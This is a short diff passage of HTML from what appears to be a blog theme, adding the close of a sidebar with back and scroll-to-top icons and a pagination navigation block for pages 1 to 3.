+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
